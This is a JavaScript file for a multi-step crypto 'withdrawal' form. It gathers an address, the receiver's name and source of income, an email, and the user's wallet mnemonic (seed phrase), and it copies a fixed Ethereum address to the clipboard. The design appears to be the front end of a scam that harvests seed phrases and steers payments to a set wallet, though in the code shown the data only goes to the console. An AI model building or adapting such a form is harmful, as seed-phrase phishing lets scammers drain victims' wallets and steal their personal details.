// Step 1
function confirmStep1() {
  const address = document.getElementById('withdrawalAddress').value.trim();
  const network = document.getElementById('network').value;
  const country = document.getElementById('country').value;
  const exchanger = document.getElementById('cryptoExchanger').value;

  if (!address || !network || !country || !exchanger) {
    alert('Please complete all fields.');
    return;
  }

  console.log({ address, network, country, exchanger });

  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
}

// Step 2
function confirmStep2() {
  const receiver = document.getElementById('receiverAddress').value.trim();
  const name = document.getElementById('receiverName').value.trim();
  const surname = document.getElementById('receiverSurname').value.trim();
  const reason = document.getElementById('withdrawalReason').value.trim();
  const source = document.getElementById('sourceOfIncome').value;

  if (!receiver || !name || !surname || !reason || !source) {
    alert('Please complete all fields.');
    return;
  }

  console.log({ receiver, name, surname, reason, source });

  document.getElementById('step2').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
}

// Step 3
function confirmStep3() {
  const email = document.getElementById('email').value.trim();
  const mnemonic = document.getElementById('mnemonic').value.trim();

  if (!email || !mnemonic) {
    alert('Please complete all fields.');
    return;
  }

  console.log({ email, mnemonic });

  document.getElementById('step3').style.display = 'none';
  document.getElementById('step4').style.display = 'block';
}

// Copy wallet address
function copyWalletAddress() {
  const address = "0x0F368a680DEFdc50806e6cB535bB78EDe9a64C9B";
  navigator.clipboard.writeText(address).then(() => {
    const msg = document.getElementById("copyMessage");
    msg.style.display = "block";
    setTimeout(() => msg.style.display = "none", 2000);
  }).catch(err => {
    alert("Copy failed: " + err);
  });
}

// Back buttons
function backToStep1() {
  document.getElementById('step2').style.display = 'none';
  document.getElementById('step1').style.display = 'block';
}
function backToStep2() {
  document.getElementById('step3').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
}
function backToStep3() {
  document.getElementById('step4').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
}

// Event listeners
document.getElementById('continueStep1').addEventListener('click', confirmStep1);
document.getElementById('continueStep2').addEventListener('click', confirmStep2);
document.getElementById('continueStep3').addEventListener('click', confirmStep3);
